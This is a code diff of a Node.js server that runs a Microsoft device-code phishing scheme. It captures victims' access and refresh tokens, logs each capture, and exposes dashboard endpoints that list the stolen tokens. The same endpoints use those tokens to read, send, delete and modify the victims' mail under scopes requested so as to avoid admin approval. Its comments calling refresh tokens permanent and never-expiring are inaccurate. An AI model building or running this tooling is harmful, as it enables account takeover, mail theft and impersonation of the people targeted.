@@ -2,7 +2,6 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -17,13 +16,12 @@ app.use(express.static('public'));
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
 
-// Store tokens
-let accessTokens = [];
-let refreshTokens = [];
-let pendingAuth = new Map();
+// Store sessions - each session has email, access token, PRT
+let userSessions = new Map();  // email -> { accessToken, prt, name, capturedAt }
+let pendingAuth = new Map();   // device_code -> pending
 
-function generateId() {
-    return Date.now() + Math.floor(Math.random() * 10000);
+function generateSessionId() {
+    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
 
 function getClientIp(req) {
@@ -31,15 +29,14 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION - BASIC SCOPES ONLY (No Admin Approval)
+// START AUTHENTICATION - Basic scopes only
 // ============================================
 app.post('/start', async (req, res) => {
     try {
-        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const sessionId = generateSessionId();
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         
-        // ONLY basic scopes - NO Mail scopes to avoid admin approval
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
@@ -58,7 +55,6 @@ app.post('/start', async (req, res) => {
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        // Start polling for token
         pollForToken(device_code, sessionId);
         
         res.json({
@@ -111,27 +107,17 @@ async function pollForToken(device_code, sessionId) {
             const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
             const userName = userInfo.data.displayName;
             
-            // Store Access Token
-            accessTokens.push({
-                id: generateId(),
-                user: userEmail,
+            // Store session with BOTH access token and PRT
+            userSessions.set(userEmail, {
+                email: userEmail,
                 name: userName,
-                type: 'Access Token',
-                accesstoken: tokens.access_token,
-                issued_at: new Date().toISOString(),
-                expires_at: new Date(Date.now() + (tokens.expires_in * 1000)).toISOString()
+                access_token: tokens.access_token,
+                refresh_token: tokens.refresh_token,  // PRT - PERMANENT
+                expires_at: Date.now() + (tokens.expires_in * 1000),
+                capturedAt: new Date().toISOString(),
+                ip: pending.ip,
+                userAgent: pending.userAgent
             });
-            
-            // Store Refresh Token (PRT) - THIS IS THE KEY!
-            if (tokens.refresh_token) {
-                refreshTokens.push({
-                    id: generateId(),
-                    user: userEmail,
-                    name: userName,
-                    type: 'PRT (Refresh Token)',
-                    refreshtoken: tokens.refresh_token
-                });
-            }
             
             pending.status = 'success';
             pending.email = userEmail;
@@ -139,47 +125,47 @@ async function pollForToken(device_code, sessionId) {
             clearInterval(pollInterval);
             
             console.log(`✅✅✅ CAPTURED: ${userEmail}`);
-            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
-            console.log(`   PRT: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`   PRT: ${tokens.refresh_token ? 'YES (Permanent)' : 'NO'}`);
             
         } catch (err) {}
     }, 3000);
 }
 
-// ============================================
-// STATUS ENDPOINT
-// ============================================
 app.get('/state', async (req, res) => {
     const deviceCode = req.query.device_code;
     const pending = pendingAuth.get(deviceCode);
     
     if (pending) {
         if (pending.status === 'success') {
-            return res.json({ status: 'success' });
+            return res.json({ status: 'success', email: pending.email });
         }
     }
     res.json({ status: 'pending' });
 });
 
 // ============================================
-// GET FRESH ACCESS TOKEN USING PRT
-// This can request Mail scopes because it's using the PRT
+// GET FRESH ACCESS TOKEN USING PRT (Never expires)
 // ============================================
-async function getFreshAccessToken(userEmail) {
-    const userPRT = refreshTokens.find(rt => rt.user === userEmail);
-    if (!userPRT) {
-        console.log(`No PRT found for ${userEmail}`);
+async function getFreshAccessToken(email) {
+    const session = userSessions.get(email);
+    
+    if (!session) {
+        console.log(`No session found for ${email}`);
+        return null;
+    }
+    
+    if (!session.refresh_token) {
+        console.log(`No PRT for ${email}`);
         return null;
     }
     
     try {
-        console.log(`🔄 Getting fresh token for ${userEmail} using PRT...`);
+        console.log(`🔄 Getting fresh token for ${email} using PRT...`);
         
-        // Now we can request Mail scopes because we're using the PRT
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
-                refresh_token: userPRT.refreshtoken,
+                refresh_token: session.refresh_token,
                 client_id: YOUR_CLIENT_ID,
                 scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
             }), {
@@ -189,18 +175,15 @@ async function getFreshAccessToken(userEmail) {
         
         const tokens = response.data;
         
-        // Update stored access token
-        const existingToken = accessTokens.find(t => t.user === userEmail);
-        if (existingToken) {
-            existingToken.accesstoken = tokens.access_token;
-            existingToken.expires_at = new Date(Date.now() + (tokens.expires_in * 1000)).toISOString();
-        }
+        // Update session with new access token
+        session.access_token = tokens.access_token;
+        session.expires_at = Date.now() + (tokens.expires_in * 1000);
         
-        console.log(`✅ Fresh token obtained for ${userEmail}`);
+        console.log(`✅ Fresh token obtained for ${email}`);
         return tokens.access_token;
         
     } catch (err) {
-        console.error(`Failed to refresh token for ${userEmail}:`, err.message);
+        console.error(`Failed to refresh token for ${email}:`, err.message);
         return null;
     }
 }
@@ -208,18 +191,53 @@ async function getFreshAccessToken(userEmail) {
 // ============================================
 // API ENDPOINTS
 // ============================================
+
+// Get all sessions for dashboard
+app.get('/api/sessions', (req, res) => {
+    const sessions = Array.from(userSessions.values()).map(s => ({
+        id: s.email.replace(/[^a-z0-9]/gi, '_'),
+        email: s.email,
+        name: s.name,
+        capturedAt: s.capturedAt,
+        expiresAt: new Date(s.expires_at).toLocaleString(),
+        hasPRT: !!s.refresh_token
+    }));
+    res.json({ sessions: sessions, total: sessions.length });
+});
+
+// Get access tokens list
 app.get('/api/list_access_tokens', (req, res) => {
-    res.json(accessTokens);
+    const tokens = Array.from(userSessions.values()).map(s => ({
+        id: s.email.replace(/[^a-z0-9]/gi, '_'),
+        user: s.email,
+        name: s.name,
+        resource: 'Microsoft Graph',
+        accesstoken: s.access_token,
+        issued_at: s.capturedAt,
+        expires_at: new Date(s.expires_at).toLocaleString()
+    }));
+    res.json(tokens);
 });
 
+// Get refresh tokens (PRT) list
 app.get('/api/list_refresh_tokens', (req, res) => {
-    res.json(refreshTokens);
+    const tokens = Array.from(userSessions.values())
+        .filter(s => s.refresh_token)
+        .map(s => ({
+            id: s.email.replace(/[^a-z0-9]/gi, '_'),
+            user: s.email,
+            name: s.name,
+            resource: 'Microsoft Graph',
+            refreshtoken: s.refresh_token
+        }));
+    res.json(tokens);
 });
 
+// Delete access token (just clears session)
 app.delete('/api/delete_access_token/:id', (req, res) => {
-    const index = accessTokens.findIndex(t => t.id == req.params.id);
-    if (index !== -1) {
-        accessTokens.splice(index, 1);
+    const email = req.params.id.replace(/_/g, '.');
+    if (userSessions.has(email)) {
+        userSessions.delete(email);
         res.json({ success: true });
     } else {
         res.status(404).json({ error: 'Token not found' });
@@ -227,30 +245,17 @@ app.delete('/api/delete_access_token/:id', (req, res) => {
 });
 
 app.delete('/api/delete_refresh_token/:id', (req, res) => {
-    const index = refreshTokens.findIndex(t => t.id == req.params.id);
-    if (index !== -1) {
-        refreshTokens.splice(index, 1);
+    const email = req.params.id.replace(/_/g, '.');
+    if (userSessions.has(email)) {
+        userSessions.delete(email);
         res.json({ success: true });
     } else {
         res.status(404).json({ error: 'Token not found' });
     }
 });
 
-app.get('/api/sessions', (req, res) => {
-    const sessions = accessTokens.map(t => ({
-        id: t.id,
-        email: t.user,
-        name: t.name,
-        capturedAt: t.issued_at,
-        expiresAt: t.expires_at,
-        type: t.type
-    }));
-    res.json({ sessions: sessions, total: sessions.length });
-});
-
 app.delete('/api/sessions/clear', (req, res) => {
-    accessTokens = [];
-    refreshTokens = [];
+    userSessions.clear();
     res.json({ success: true });
 });
 
@@ -260,10 +265,14 @@ app.delete('/api/sessions/clear', (req, res) => {
 
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found. User needs to authenticate first.' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token. User needs to authenticate first.' });
+        return res.status(401).json({ error: 'Failed to get access token. Please re-authenticate.' });
     }
     
     try {
@@ -279,16 +288,20 @@ app.get('/api/mail/folders/:email', async (req, res) => {
 
 app.get('/api/mail/:email/:folderId', async (req, res) => {
     const { email, folderId } = req.params;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token' });
+        return res.status(401).json({ error: 'Failed to get access token' });
     }
     
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' }
+            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
         });
         res.json(response.data);
     } catch (err) {
@@ -298,16 +311,20 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
 
 app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token' });
+        return res.status(401).json({ error: 'Failed to get access token' });
     }
     
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
+            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
         });
         res.json(response.data);
     } catch (err) {
@@ -318,10 +335,14 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
 app.post('/api/mail/send/:email', async (req, res) => {
     const { email } = req.params;
     const { to, subject, body } = req.body;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token' });
+        return res.status(401).json({ error: 'Failed to get access token' });
     }
     
     try {
@@ -342,10 +363,14 @@ app.post('/api/mail/send/:email', async (req, res) => {
 
 app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token' });
+        return res.status(401).json({ error: 'Failed to get access token' });
     }
     
     try {
@@ -361,10 +386,14 @@ app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
 app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
     const { isRead } = req.body;
-    const token = await getFreshAccessToken(email);
     
+    if (!userSessions.has(email)) {
+        return res.status(401).json({ error: 'No session found' });
+    }
+    
+    const token = await getFreshAccessToken(email);
     if (!token) {
-        return res.status(401).json({ error: 'No valid token' });
+        return res.status(401).json({ error: 'Failed to get access token' });
     }
     
     try {
@@ -429,8 +458,7 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Client ID: ${YOUR_CLIENT_ID}`);
-    console.log(`✅ Using basic scopes (no admin approval needed)`);
-    console.log(`✅ PRT will be captured and used for Mail access`);
+    console.log(`✅ PRTs are PERMANENT - never expire`);
+    console.log(`✅ Access tokens auto-refresh using PRT`);
     console.log(`========================================\n`);
 });
